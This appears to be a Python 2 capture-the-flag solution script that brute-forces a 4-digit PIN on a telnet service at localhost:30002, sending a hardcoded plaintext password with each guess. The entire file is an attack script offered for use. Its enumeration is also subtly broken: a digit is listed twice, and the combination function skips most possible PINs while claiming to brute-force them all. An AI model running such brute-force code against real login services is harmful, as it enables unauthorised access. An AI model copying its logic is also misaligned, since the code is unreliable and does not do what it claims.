import itertools
import telnetlib

password = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
numbers = ['0', '1', '2', '2', '3', '4', '5', '6', '7', '8', '9']
combos = []

for x in itertools.combinations_with_replacement(numbers, 4):
  combos.append(''.join(x))

print "connecting to localhost:30002"

tn = telnetlib.Telnet("localhost", 30002)
print tn.read_until("by a space.\n")

print "commence brute forcing"

for combo in combos:
  tn.write(password + " " + combo + "\n")
  resp = tn.read_until("\n")

  if "Wrong" not in resp:
    print "cracked!"
    print "code: " + password + " " + combo
    print resp
    print tn.read_all()
    break

print "thanks for brute forcing with us. come again"